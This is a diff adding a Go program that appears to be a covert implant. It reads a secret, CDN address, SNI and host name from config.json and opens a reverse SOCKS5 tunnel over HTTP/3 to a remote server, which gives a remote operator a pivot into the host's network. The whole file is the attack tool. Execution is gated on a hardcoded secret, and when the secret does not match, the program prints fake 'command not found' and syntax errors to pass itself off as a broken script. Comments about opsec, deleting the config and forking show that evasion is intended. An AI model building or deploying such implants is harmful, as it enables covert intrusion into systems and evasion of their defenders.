@@ -1,0 +1,88 @@
+package main
+
+import (
+	"encoding/json"
+	"fmt"
+	"io/ioutil"
+	"os"
+	"runtime"
+	"time"
+
+	"git.cyru1s.com/cyru1s/http3proxy/proxy"
+)
+
+type Conf_result struct {
+	Secret      string
+	Cdn_ip_port string
+	Sni_name    string
+	Host_name   string
+}
+
+func main() {
+	jsonFile, err := os.Open("config.json")
+	if err != nil {
+		fmt.Println(err)
+	}
+	defer jsonFile.Close()
+
+	byteValue, _ := ioutil.ReadAll(jsonFile)
+
+	var result Conf_result
+	json.Unmarshal([]byte(byteValue), &result)
+
+	fmt.Println(result)
+	secret := result.Secret
+
+	cdn_ip_port := result.Cdn_ip_port
+
+	sni_name := result.Sni_name
+	fmt.Println(sni_name)
+
+	host_name := result.Host_name
+	fmt.Println(host_name)
+
+	//Use a secret to enhence opsec
+	if secret != "C{ZM2<%4H!)$kQ8cuaV?" {
+		printErr()
+		os.Exit(0)
+	}
+
+	//To do
+	//delete the config file
+
+	//fork and run enhence opsec
+	//id, _, _ := syscall.Syscall(syscall.SYS_FORK, 0, 0, 0)
+	//if id == 0 {
+	//child process
+	var proxyprotostr []string
+	proxyprotostr = append(proxyprotostr, "tcp")
+	var fromaddr []string
+	fromaddr = append(fromaddr, ":8080")
+
+	var toaddr []string
+	toaddr = append(toaddr, "")
+	config := proxy.DefaultConfig()
+	_, err = proxy.NewClient(config, "rhttp3", cdn_ip_port, "test", "REVERSE_SOCKS5", proxyprotostr, fromaddr, toaddr)
+	if err != nil {
+		fmt.Println("err")
+	}
+	for {
+		time.Sleep(time.Hour)
+	}
+
+	//} else {
+	//	os.Exit(0)
+	//}
+
+}
+
+func printErr() {
+	switch runtime.GOOS {
+	case "windows":
+		fmt.Printf("'%s' 不是内部或外部命令，也不是可运行的程序或批处理文件。\r\n", os.Args[0])
+	case "linux":
+		fmt.Printf("%s: line 6: ��e�WDT# : No such file or directory\r\n", os.Args[0])
+		fmt.Printf("%s: line 15: syntax error near unexpected token `('\r\n", os.Args[0])
+	default:
+	}
+}
